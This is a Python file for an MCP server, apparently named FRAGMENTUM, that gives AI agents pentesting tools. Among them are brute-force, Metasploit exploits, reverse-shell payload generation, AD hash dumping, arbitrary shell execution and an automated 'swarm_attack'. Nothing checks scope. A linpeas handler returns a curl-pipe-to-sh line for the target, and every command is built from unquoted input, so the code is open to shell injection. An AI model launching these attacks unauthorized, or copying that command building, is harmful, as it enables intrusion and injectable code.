"""
FRAGMENTUM MCP Server

Servidor MCP que expõe ferramentas de pentesting para agentes de IA.
Compatível com Claude, Kiro, Cursor, etc.
"""

import asyncio
import json
import sys
from typing import Any, Dict, List, Optional
from dataclasses import dataclass, asdict

# MCP imports
try:
    from mcp.server import Server
    from mcp.server.stdio import stdio_server
    from mcp.types import Tool, TextContent, CallToolResult
    HAS_MCP = True
except ImportError:
    HAS_MCP = False
    print("MCP não instalado. Execute: pip install mcp")


@dataclass
class ToolDefinition:
    """Definição de ferramenta MCP"""
    name: str
    description: str
    parameters: Dict[str, Any]


class FragmentumMCPServer:
    """
    Servidor MCP do FRAGMENTUM.
    
    Expõe ferramentas de pentesting via protocolo MCP.
    """
    
    def __init__(self):
        if not HAS_MCP:
            raise ImportError("MCP não instalado")
        
        self.server = Server("fragmentum")
        self._setup_tools()
        self._setup_handlers()
    
    def _setup_tools(self):
        """Define ferramentas disponíveis"""
        self.tools = {
            # === SCANNING ===
            "nmap_scan": ToolDefinition(
                name="nmap_scan",
                description="Executa scan de portas e serviços com nmap",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP ou hostname do alvo"},
                        "ports": {"type": "string", "description": "Portas (ex: 1-1000, 22,80,443)", "default": "1-1000"},
                        "options": {"type": "string", "description": "Opções extras do nmap", "default": "-sV -sC"}
                    },
                    "required": ["target"]
                }
            ),
            
            "masscan": ToolDefinition(
                name="masscan",
                description="Scan rápido de portas com masscan",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP ou range"},
                        "ports": {"type": "string", "description": "Portas", "default": "1-65535"},
                        "rate": {"type": "integer", "description": "Taxa de pacotes/s", "default": 1000}
                    },
                    "required": ["target"]
                }
            ),
            
            # === ENUMERATION ===
            "enum4linux": ToolDefinition(
                name="enum4linux",
                description="Enumera informações SMB/Samba",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do alvo"}
                    },
                    "required": ["target"]
                }
            ),
            
            "smbmap": ToolDefinition(
                name="smbmap",
                description="Mapeia shares SMB",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do alvo"},
                        "user": {"type": "string", "description": "Usuário", "default": ""},
                        "password": {"type": "string", "description": "Senha", "default": ""}
                    },
                    "required": ["target"]
                }
            ),
            
            # === WEB ===
            "gobuster": ToolDefinition(
                name="gobuster",
                description="Brute-force de diretórios web",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL do alvo"},
                        "wordlist": {"type": "string", "description": "Wordlist", "default": "/usr/share/wordlists/dirb/common.txt"},
                        "threads": {"type": "integer", "description": "Threads", "default": 50}
                    },
                    "required": ["target"]
                }
            ),
            
            "nikto": ToolDefinition(
                name="nikto",
                description="Scanner de vulnerabilidades web",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL ou IP do alvo"}
                    },
                    "required": ["target"]
                }
            ),
            
            "sqlmap": ToolDefinition(
                name="sqlmap",
                description="Detecta e explora SQL injection",
                parameters={
                    "type": "object",
                    "properties": {
                        "url": {"type": "string", "description": "URL com parâmetro vulnerável"},
                        "level": {"type": "integer", "description": "Nível de testes (1-5)", "default": 3},
                        "risk": {"type": "integer", "description": "Risco (1-3)", "default": 2}
                    },
                    "required": ["url"]
                }
            ),
            
            # === PASSWORD ===
            "hydra": ToolDefinition(
                name="hydra",
                description="Brute-force de credenciais",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do alvo"},
                        "service": {"type": "string", "description": "Serviço (ssh, ftp, http-post, etc)"},
                        "user": {"type": "string", "description": "Usuário ou arquivo de usuários"},
                        "wordlist": {"type": "string", "description": "Wordlist de senhas", "default": "/usr/share/wordlists/rockyou.txt"}
                    },
                    "required": ["target", "service", "user"]
                }
            ),
            
            # === EXPLOIT ===
            "searchsploit": ToolDefinition(
                name="searchsploit",
                description="Busca exploits no Exploit-DB",
                parameters={
                    "type": "object",
                    "properties": {
                        "query": {"type": "string", "description": "Termo de busca (ex: vsftpd 2.3.4)"}
                    },
                    "required": ["query"]
                }
            ),
            
            "msf_exploit": ToolDefinition(
                name="msf_exploit",
                description="Executa exploit do Metasploit",
                parameters={
                    "type": "object",
                    "properties": {
                        "exploit": {"type": "string", "description": "Nome do exploit (vsftpd, samba, distcc, etc)"},
                        "target": {"type": "string", "description": "IP do alvo"},
                        "options": {"type": "object", "description": "Opções extras", "default": {}}
                    },
                    "required": ["exploit", "target"]
                }
            ),
            
            # === OSINT ===
            "subfinder": ToolDefinition(
                name="subfinder",
                description="Descobre subdomínios",
                parameters={
                    "type": "object",
                    "properties": {
                        "domain": {"type": "string", "description": "Domínio alvo"}
                    },
                    "required": ["domain"]
                }
            ),
            
            "theharvester": ToolDefinition(
                name="theharvester",
                description="Coleta emails e subdomínios",
                parameters={
                    "type": "object",
                    "properties": {
                        "domain": {"type": "string", "description": "Domínio alvo"},
                        "source": {"type": "string", "description": "Fonte (google, bing, all)", "default": "all"}
                    },
                    "required": ["domain"]
                }
            ),
            
            # === UTILITY ===
            "execute_command": ToolDefinition(
                name="execute_command",
                description="Executa comando shell arbitrário",
                parameters={
                    "type": "object",
                    "properties": {
                        "command": {"type": "string", "description": "Comando a executar"},
                        "timeout": {"type": "integer", "description": "Timeout em segundos", "default": 180}
                    },
                    "required": ["command"]
                }
            ),
            
            "get_session_info": ToolDefinition(
                name="get_session_info",
                description="Obtém informações da sessão atual",
                parameters={
                    "type": "object",
                    "properties": {}
                }
            ),
            
            # === MAIS SCANNING ===
            "nmap_udp": ToolDefinition(
                name="nmap_udp",
                description="Scan de portas UDP",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do alvo"},
                        "ports": {"type": "string", "description": "Portas", "default": "top-100"}
                    },
                    "required": ["target"]
                }
            ),
            
            "nmap_vuln": ToolDefinition(
                name="nmap_vuln",
                description="Scan de vulnerabilidades com scripts NSE",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do alvo"}
                    },
                    "required": ["target"]
                }
            ),
            
            # === MAIS ENUMERATION ===
            "showmount": ToolDefinition(
                name="showmount",
                description="Enumera shares NFS",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do alvo"}
                    },
                    "required": ["target"]
                }
            ),
            
            "nbtscan": ToolDefinition(
                name="nbtscan",
                description="Scanner NetBIOS",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP ou range"}
                    },
                    "required": ["target"]
                }
            ),
            
            "smtp_enum": ToolDefinition(
                name="smtp_enum",
                description="Enumera usuários via SMTP VRFY",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do servidor SMTP"},
                        "wordlist": {"type": "string", "description": "Wordlist de usuários", "default": "/usr/share/wordlists/metasploit/unix_users.txt"}
                    },
                    "required": ["target"]
                }
            ),
            
            # === MAIS WEB ===
            "dirb": ToolDefinition(
                name="dirb",
                description="Scanner de diretórios web",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL do alvo"},
                        "wordlist": {"type": "string", "description": "Wordlist", "default": "/usr/share/wordlists/dirb/common.txt"}
                    },
                    "required": ["target"]
                }
            ),
            
            "wfuzz": ToolDefinition(
                name="wfuzz",
                description="Web fuzzer avançado",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL com FUZZ placeholder"},
                        "wordlist": {"type": "string", "description": "Wordlist", "default": "/usr/share/wordlists/dirb/common.txt"}
                    },
                    "required": ["target"]
                }
            ),
            
            "wpscan": ToolDefinition(
                name="wpscan",
                description="Scanner de vulnerabilidades WordPress",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL do WordPress"},
                        "enumerate": {"type": "string", "description": "O que enumerar (vp,vt,u)", "default": "vp,vt,u"}
                    },
                    "required": ["target"]
                }
            ),
            
            "xsstrike": ToolDefinition(
                name="xsstrike",
                description="Scanner de XSS",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL com parâmetro"}
                    },
                    "required": ["target"]
                }
            ),
            
            "commix": ToolDefinition(
                name="commix",
                description="Scanner de command injection",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL com parâmetro"}
                    },
                    "required": ["target"]
                }
            ),
            
            # === MAIS PASSWORD ===
            "hydra_smb": ToolDefinition(
                name="hydra_smb",
                description="Brute-force SMB",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do alvo"},
                        "user": {"type": "string", "description": "Usuário", "default": "administrator"},
                        "wordlist": {"type": "string", "description": "Wordlist", "default": "/usr/share/wordlists/rockyou.txt"}
                    },
                    "required": ["target"]
                }
            ),
            
            "hydra_mysql": ToolDefinition(
                name="hydra_mysql",
                description="Brute-force MySQL",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do alvo"},
                        "user": {"type": "string", "description": "Usuário", "default": "root"},
                        "wordlist": {"type": "string", "description": "Wordlist", "default": "/usr/share/wordlists/rockyou.txt"}
                    },
                    "required": ["target"]
                }
            ),
            
            "crackmapexec": ToolDefinition(
                name="crackmapexec",
                description="Swiss army knife para pentesting Windows/AD",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP ou range"},
                        "protocol": {"type": "string", "description": "Protocolo (smb, winrm, ssh)", "default": "smb"},
                        "user": {"type": "string", "description": "Usuário", "default": ""},
                        "password": {"type": "string", "description": "Senha ou wordlist", "default": ""}
                    },
                    "required": ["target"]
                }
            ),
            
            # === MAIS EXPLOIT ===
            "msfvenom": ToolDefinition(
                name="msfvenom",
                description="Gera payloads (reverse shell, etc)",
                parameters={
                    "type": "object",
                    "properties": {
                        "payload": {"type": "string", "description": "Payload (linux/x64/shell_reverse_tcp, windows/x64/meterpreter/reverse_tcp, etc)"},
                        "lhost": {"type": "string", "description": "IP local para callback"},
                        "lport": {"type": "string", "description": "Porta local", "default": "4444"},
                        "format": {"type": "string", "description": "Formato (elf, exe, php, py)", "default": "elf"}
                    },
                    "required": ["payload", "lhost"]
                }
            ),
            
            "nuclei": ToolDefinition(
                name="nuclei",
                description="Scanner de vulnerabilidades baseado em templates",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL do alvo"},
                        "templates": {"type": "string", "description": "Templates (cves, vulns, etc)", "default": "cves"}
                    },
                    "required": ["target"]
                }
            ),
            
            # === OSINT ===
            "whois": ToolDefinition(
                name="whois",
                description="Consulta WHOIS de domínio/IP",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "Domínio ou IP"}
                    },
                    "required": ["target"]
                }
            ),
            
            "dnsenum": ToolDefinition(
                name="dnsenum",
                description="Enumeração DNS completa",
                parameters={
                    "type": "object",
                    "properties": {
                        "domain": {"type": "string", "description": "Domínio alvo"}
                    },
                    "required": ["domain"]
                }
            ),
            
            # === NETWORK ===
            "netdiscover": ToolDefinition(
                name="netdiscover",
                description="Descoberta de hosts na rede",
                parameters={
                    "type": "object",
                    "properties": {
                        "range": {"type": "string", "description": "Range (ex: 192.168.1.0/24)"}
                    },
                    "required": ["range"]
                }
            ),
            
            "arp_scan": ToolDefinition(
                name="arp_scan",
                description="Scan ARP da rede local",
                parameters={
                    "type": "object",
                    "properties": {
                        "interface": {"type": "string", "description": "Interface de rede", "default": "eth0"}
                    }
                }
            ),
            
            # === POST-EXPLOITATION ===
            "linpeas": ToolDefinition(
                name="linpeas",
                description="Linux privilege escalation scanner",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do alvo (executa via SSH)", "default": ""}
                    }
                }
            ),
            
            # === ACTIVE DIRECTORY ===
            "impacket_secretsdump": ToolDefinition(
                name="impacket_secretsdump",
                description="Dump de hashes e secrets do AD",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do DC"},
                        "domain": {"type": "string", "description": "Domínio"},
                        "user": {"type": "string", "description": "Usuário"},
                        "password": {"type": "string", "description": "Senha"}
                    },
                    "required": ["target", "domain", "user", "password"]
                }
            ),
            
            "impacket_psexec": ToolDefinition(
                name="impacket_psexec",
                description="Execução remota via PSExec",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do alvo"},
                        "domain": {"type": "string", "description": "Domínio"},
                        "user": {"type": "string", "description": "Usuário"},
                        "password": {"type": "string", "description": "Senha"}
                    },
                    "required": ["target", "domain", "user", "password"]
                }
            ),
            
            "evil_winrm": ToolDefinition(
                name="evil_winrm",
                description="Shell WinRM",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do alvo"},
                        "user": {"type": "string", "description": "Usuário"},
                        "password": {"type": "string", "description": "Senha"}
                    },
                    "required": ["target", "user", "password"]
                }
            ),
            
            # === CLOUD ===
            "aws_enum": ToolDefinition(
                name="aws_enum",
                description="Enumera recursos AWS",
                parameters={
                    "type": "object",
                    "properties": {
                        "service": {"type": "string", "description": "Serviço (s3, ec2, iam)", "default": "s3"},
                        "action": {"type": "string", "description": "Ação", "default": "ls"}
                    }
                }
            ),
            
            # === CONTAINERS ===
            "trivy": ToolDefinition(
                name="trivy",
                description="Scanner de vulnerabilidades em containers",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "Imagem ou filesystem"}
                    },
                    "required": ["target"]
                }
            ),
            
            "kube_hunter": ToolDefinition(
                name="kube_hunter",
                description="Scanner de segurança Kubernetes",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP do cluster"}
                    },
                    "required": ["target"]
                }
            ),
            
            # === BINARY ===
            "checksec": ToolDefinition(
                name="checksec",
                description="Verifica proteções de binário",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "Caminho do binário"}
                    },
                    "required": ["target"]
                }
            ),
            
            "strings_bin": ToolDefinition(
                name="strings_bin",
                description="Extrai strings de binário",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "Caminho do binário"}
                    },
                    "required": ["target"]
                }
            ),
            
            # === FORENSICS ===
            "exiftool": ToolDefinition(
                name="exiftool",
                description="Extrai metadados de arquivos",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "Caminho do arquivo"}
                    },
                    "required": ["target"]
                }
            ),
            
            "binwalk": ToolDefinition(
                name="binwalk",
                description="Análise de firmware",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "Caminho do arquivo"}
                    },
                    "required": ["target"]
                }
            ),
            
            # === MAIS WEB ===
            "feroxbuster": ToolDefinition(
                name="feroxbuster",
                description="Descoberta de conteúdo web rápida",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL do alvo"},
                        "wordlist": {"type": "string", "description": "Wordlist", "default": "/usr/share/wordlists/dirb/common.txt"}
                    },
                    "required": ["target"]
                }
            ),
            
            "ffuf": ToolDefinition(
                name="ffuf",
                description="Fuzzer web rápido",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL com FUZZ placeholder"},
                        "wordlist": {"type": "string", "description": "Wordlist", "default": "/usr/share/wordlists/dirb/common.txt"}
                    },
                    "required": ["target"]
                }
            ),
            
            "whatweb": ToolDefinition(
                name="whatweb",
                description="Identifica tecnologias web",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL do alvo"}
                    },
                    "required": ["target"]
                }
            ),
            
            "wafw00f": ToolDefinition(
                name="wafw00f",
                description="Detecta WAF",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "URL do alvo"}
                    },
                    "required": ["target"]
                }
            ),
            
            # === MAIS OSINT ===
            "sherlock": ToolDefinition(
                name="sherlock",
                description="Busca username em redes sociais",
                parameters={
                    "type": "object",
                    "properties": {
                        "username": {"type": "string", "description": "Username a buscar"}
                    },
                    "required": ["username"]
                }
            ),
            
            "assetfinder": ToolDefinition(
                name="assetfinder",
                description="Encontra subdomínios e assets",
                parameters={
                    "type": "object",
                    "properties": {
                        "domain": {"type": "string", "description": "Domínio alvo"}
                    },
                    "required": ["domain"]
                }
            ),
            
            # === MAIS NETWORK ===
            "traceroute": ToolDefinition(
                name="traceroute",
                description="Traça rota até o alvo",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP ou hostname"}
                    },
                    "required": ["target"]
                }
            ),
            
            "tcpdump": ToolDefinition(
                name="tcpdump",
                description="Captura pacotes de rede",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP para filtrar"},
                        "count": {"type": "integer", "description": "Número de pacotes", "default": 100}
                    },
                    "required": ["target"]
                }
            ),
            
            # === SWARM - MULTI-AGENT ===
            "swarm_attack": ToolDefinition(
                name="swarm_attack",
                description="Executa ataque Swarm com múltiplos agentes em paralelo (recon, web, network, exploit, password). Ataque completo automatizado.",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "IP ou domínio do alvo"},
                        "enable_exploitation": {"type": "boolean", "description": "Habilita tentativas de exploração", "default": True},
                        "enable_password_attacks": {"type": "boolean", "description": "Habilita ataques de senha", "default": True},
                        "aggressive_mode": {"type": "boolean", "description": "Modo agressivo (mais rápido, mais barulhento)", "default": False}
                    },
                    "required": ["target"]
                }
            ),
            
            "swarm_status": ToolDefinition(
                name="swarm_status",
                description="Retorna status e resultados de uma sessão Swarm",
                parameters={
                    "type": "object",
                    "properties": {
                        "session_id": {"type": "string", "description": "ID da sessão Swarm"}
                    },
                    "required": ["session_id"]
                }
            ),
        }
    
    def _setup_handlers(self):
        """Configura handlers MCP"""
        
        @self.server.list_tools()
        async def list_tools() -> List[Tool]:
            """Lista ferramentas disponíveis"""
            return [
                Tool(
                    name=t.name,
                    description=t.description,
                    inputSchema=t.parameters
                )
                for t in self.tools.values()
            ]
        
        @self.server.call_tool()
        async def call_tool(name: str, arguments: Dict[str, Any]) -> CallToolResult:
            """Executa ferramenta"""
            try:
                result = await self._execute_tool(name, arguments)
                return CallToolResult(
                    content=[TextContent(type="text", text=result)]
                )
            except Exception as e:
                return CallToolResult(
                    content=[TextContent(type="text", text=f"Erro: {str(e)}")]
                )
    
    async def _execute_tool(self, name: str, args: Dict[str, Any]) -> str:
        """Executa ferramenta específica"""
        from fragmentum.tools.executor import execute_command, execute_with_pty
        
        if name == "nmap_scan":
            target = args["target"]
            ports = args.get("ports", "1-1000")
            options = args.get("options", "-sV -sC")
            cmd = f"nmap {options} -p {ports} {target}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "masscan":
            target = args["target"]
            ports = args.get("ports", "1-65535")
            rate = args.get("rate", 1000)
            cmd = f"masscan -p{ports} --rate={rate} {target}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "enum4linux":
            target = args["target"]
            cmd = f"enum4linux -a {target}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "smbmap":
            target = args["target"]
            user = args.get("user", "")
            password = args.get("password", "")
            cmd = f"smbmap -H {target}"
            if user:
                cmd += f" -u {user}"
            if password:
                cmd += f" -p {password}"
            output, success = await execute_command(cmd, timeout=120)
            return output
        
        elif name == "gobuster":
            target = args["target"]
            wordlist = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
            threads = args.get("threads", 50)
            cmd = f"gobuster dir -u {target} -w {wordlist} -t {threads}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "nikto":
            target = args["target"]
            cmd = f"nikto -h {target}"
            output, success = await execute_command(cmd, timeout=600)
            return output
        
        elif name == "sqlmap":
            url = args["url"]
            level = args.get("level", 3)
            risk = args.get("risk", 2)
            cmd = f"sqlmap -u '{url}' --batch --level={level} --risk={risk}"
            output, success = await execute_command(cmd, timeout=600)
            return output
        
        elif name == "hydra":
            target = args["target"]
            service = args["service"]
            user = args["user"]
            wordlist = args.get("wordlist", "/usr/share/wordlists/rockyou.txt")
            cmd = f"hydra -l {user} -P {wordlist} {target} {service}"
            output, success = await execute_command(cmd, timeout=900)
            return output
        
        elif name == "searchsploit":
            query = args["query"]
            cmd = f"searchsploit {query}"
            output, success = await execute_command(cmd, timeout=30)
            return output
        
        elif name == "msf_exploit":
            exploit = args["exploit"]
            target = args["target"]
            # Executa via PTY (não interativo para MCP)
            output, success = await execute_with_pty(exploit, target, interactive=False)
            return output
        
        elif name == "subfinder":
            domain = args["domain"]
            cmd = f"subfinder -d {domain}"
            output, success = await execute_command(cmd, timeout=180)
            return output
        
        elif name == "theharvester":
            domain = args["domain"]
            source = args.get("source", "all")
            cmd = f"theHarvester -d {domain} -b {source}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "execute_command":
            command = args["command"]
            timeout = args.get("timeout", 180)
            output, success = await execute_command(command, timeout=timeout)
            return output
        
        elif name == "get_session_info":
            from fragmentum.core.session import get_session_manager
            manager = get_session_manager()
            if session := manager.current_session:
                return json.dumps(session.to_dict(), indent=2)
            return "Nenhuma sessão ativa"
        
        # === NOVOS HANDLERS ===
        elif name == "nmap_udp":
            target = args["target"]
            cmd = f"nmap -sU -T4 --top-ports 100 {target}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "nmap_vuln":
            target = args["target"]
            cmd = f"nmap --script=vuln {target}"
            output, success = await execute_command(cmd, timeout=600)
            return output
        
        elif name == "showmount":
            target = args["target"]
            cmd = f"showmount -e {target}"
            output, success = await execute_command(cmd, timeout=30)
            return output
        
        elif name == "nbtscan":
            target = args["target"]
            cmd = f"nbtscan {target}"
            output, success = await execute_command(cmd, timeout=60)
            return output
        
        elif name == "smtp_enum":
            target = args["target"]
            wordlist = args.get("wordlist", "/usr/share/wordlists/metasploit/unix_users.txt")
            cmd = f"smtp-user-enum -M VRFY -U {wordlist} -t {target}"
            output, success = await execute_command(cmd, timeout=180)
            return output
        
        elif name == "dirb":
            target = args["target"]
            wordlist = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
            cmd = f"dirb {target} {wordlist}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "wfuzz":
            target = args["target"]
            wordlist = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
            cmd = f"wfuzz -c -z file,{wordlist} --hc 404 {target}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "wpscan":
            target = args["target"]
            enumerate = args.get("enumerate", "vp,vt,u")
            cmd = f"wpscan --url {target} --enumerate {enumerate}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "xsstrike":
            target = args["target"]
            cmd = f"xsstrike -u '{target}'"
            output, success = await execute_command(cmd, timeout=180)
            return output
        
        elif name == "commix":
            target = args["target"]
            cmd = f"commix -u '{target}' --batch"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "hydra_smb":
            target = args["target"]
            user = args.get("user", "administrator")
            wordlist = args.get("wordlist", "/usr/share/wordlists/rockyou.txt")
            cmd = f"hydra -l {user} -P {wordlist} smb://{target}"
            output, success = await execute_command(cmd, timeout=900)
            return output
        
        elif name == "hydra_mysql":
            target = args["target"]
            user = args.get("user", "root")
            wordlist = args.get("wordlist", "/usr/share/wordlists/rockyou.txt")
            cmd = f"hydra -l {user} -P {wordlist} mysql://{target}"
            output, success = await execute_command(cmd, timeout=900)
            return output
        
        elif name == "crackmapexec":
            target = args["target"]
            protocol = args.get("protocol", "smb")
            user = args.get("user", "")
            password = args.get("password", "")
            cmd = f"crackmapexec {protocol} {target}"
            if user:
                cmd += f" -u {user}"
            if password:
                cmd += f" -p {password}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "msfvenom":
            payload = args["payload"]
            lhost = args["lhost"]
            lport = args.get("lport", "4444")
            fmt = args.get("format", "elf")
            output_file = f"payload.{fmt}"
            cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -o {output_file}"
            output, success = await execute_command(cmd, timeout=60)
            return f"{output}\n\nPayload salvo em: {output_file}"
        
        elif name == "nuclei":
            target = args["target"]
            templates = args.get("templates", "cves")
            cmd = f"nuclei -u {target} -t {templates}/"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "whois":
            target = args["target"]
            cmd = f"whois {target}"
            output, success = await execute_command(cmd, timeout=30)
            return output
        
        elif name == "dnsenum":
            domain = args["domain"]
            cmd = f"dnsenum {domain}"
            output, success = await execute_command(cmd, timeout=180)
            return output
        
        elif name == "netdiscover":
            range_ip = args["range"]
            cmd = f"netdiscover -r {range_ip} -P"
            output, success = await execute_command(cmd, timeout=60)
            return output
        
        elif name == "arp_scan":
            interface = args.get("interface", "eth0")
            cmd = f"arp-scan -I {interface} -l"
            output, success = await execute_command(cmd, timeout=60)
            return output
        
        elif name == "linpeas":
            cmd = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
            output, success = await execute_command(cmd, timeout=30)
            return f"Script baixado. Execute no alvo:\n\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
        
        # === NOVOS HANDLERS ADICIONAIS ===
        elif name == "impacket_secretsdump":
            target = args["target"]
            domain = args["domain"]
            user = args["user"]
            password = args["password"]
            cmd = f"impacket-secretsdump {domain}/{user}:{password}@{target}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "impacket_psexec":
            target = args["target"]
            domain = args["domain"]
            user = args["user"]
            password = args["password"]
            cmd = f"impacket-psexec {domain}/{user}:{password}@{target}"
            output, success = await execute_command(cmd, timeout=60)
            return output
        
        elif name == "evil_winrm":
            target = args["target"]
            user = args["user"]
            password = args["password"]
            cmd = f"evil-winrm -i {target} -u {user} -p {password}"
            output, success = await execute_command(cmd, timeout=60)
            return output
        
        elif name == "aws_enum":
            service = args.get("service", "s3")
            action = args.get("action", "ls")
            cmd = f"aws {service} {action}"
            output, success = await execute_command(cmd, timeout=60)
            return output
        
        elif name == "trivy":
            target = args["target"]
            cmd = f"trivy image {target}"
            output, success = await execute_command(cmd, timeout=180)
            return output
        
        elif name == "kube_hunter":
            target = args["target"]
            cmd = f"kube-hunter --remote {target}"
            output, success = await execute_command(cmd, timeout=180)
            return output
        
        elif name == "checksec":
            target = args["target"]
            cmd = f"checksec --file={target}"
            output, success = await execute_command(cmd, timeout=30)
            return output
        
        elif name == "strings_bin":
            target = args["target"]
            cmd = f"strings {target}"
            output, success = await execute_command(cmd, timeout=60)
            return output
        
        elif name == "exiftool":
            target = args["target"]
            cmd = f"exiftool {target}"
            output, success = await execute_command(cmd, timeout=30)
            return output
        
        elif name == "binwalk":
            target = args["target"]
            cmd = f"binwalk -e {target}"
            output, success = await execute_command(cmd, timeout=120)
            return output
        
        elif name == "feroxbuster":
            target = args["target"]
            wordlist = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
            cmd = f"feroxbuster -u {target} -w {wordlist}"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "ffuf":
            target = args["target"]
            wordlist = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
            cmd = f"ffuf -u {target} -w {wordlist} -mc 200,301,302"
            output, success = await execute_command(cmd, timeout=300)
            return output
        
        elif name == "whatweb":
            target = args["target"]
            cmd = f"whatweb {target}"
            output, success = await execute_command(cmd, timeout=60)
            return output
        
        elif name == "wafw00f":
            target = args["target"]
            cmd = f"wafw00f {target}"
            output, success = await execute_command(cmd, timeout=60)
            return output
        
        elif name == "sherlock":
            username = args["username"]
            cmd = f"sherlock {username}"
            output, success = await execute_command(cmd, timeout=180)
            return output
        
        elif name == "assetfinder":
            domain = args["domain"]
            cmd = f"assetfinder {domain}"
            output, success = await execute_command(cmd, timeout=120)
            return output
        
        elif name == "traceroute":
            target = args["target"]
            cmd = f"traceroute {target}"
            output, success = await execute_command(cmd, timeout=60)
            return output
        
        elif name == "tcpdump":
            target = args["target"]
            count = args.get("count", 100)
            cmd = f"tcpdump -i any host {target} -c {count}"
            output, success = await execute_command(cmd, timeout=60)
            return output
        
        # === SWARM HANDLERS ===
        elif name == "swarm_attack":
            from fragmentum.swarm import SwarmController, SwarmConfig
            
            target = args["target"]
            config = SwarmConfig(
                enable_exploitation=args.get("enable_exploitation", True),
                enable_password_attacks=args.get("enable_password_attacks", True),
                aggressive_mode=args.get("aggressive_mode", False)
            )
            
            controller = SwarmController(config)
            
            # Armazena controller para consultas futuras
            if not hasattr(self, '_swarm_controllers'):
                self._swarm_controllers = {}
            
            session = await controller.attack(target)
            self._swarm_controllers[session.id] = controller
            
            # Retorna resumo
            summary = session.memory.get_summary()
            findings = session.memory.get_all_findings()
            
            result = f"""
SWARM ATTACK COMPLETED
{'='*50}
Target: {target}
Session ID: {session.id}
Status: {session.status}
Duration: {(session.end_time - session.start_time).total_seconds():.1f}s

SUMMARY:
- Ports discovered: {summary['ports']}
- Services identified: {summary['services']}
- Vulnerabilities found: {summary['vulnerabilities']}
- Credentials obtained: {summary['credentials']}
- Shells obtained: {summary['shells']}

SEVERITY BREAKDOWN:
- Critical: {summary['by_severity']['critical']}
- High: {summary['by_severity']['high']}
- Medium: {summary['by_severity']['medium']}
- Low: {summary['by_severity']['low']}
- Info: {summary['by_severity']['info']}
"""
            
            # Adiciona descobertas críticas
            critical = [f for f in findings if f.severity.value in ['critical', 'high']]
            if critical:
                result += "\nCRITICAL/HIGH FINDINGS:\n"
                for f in critical:
                    result += f"  [{f.severity.value.upper()}] {f.type.value}: {f.value}\n"
            
            return result
        
        elif name == "swarm_status":
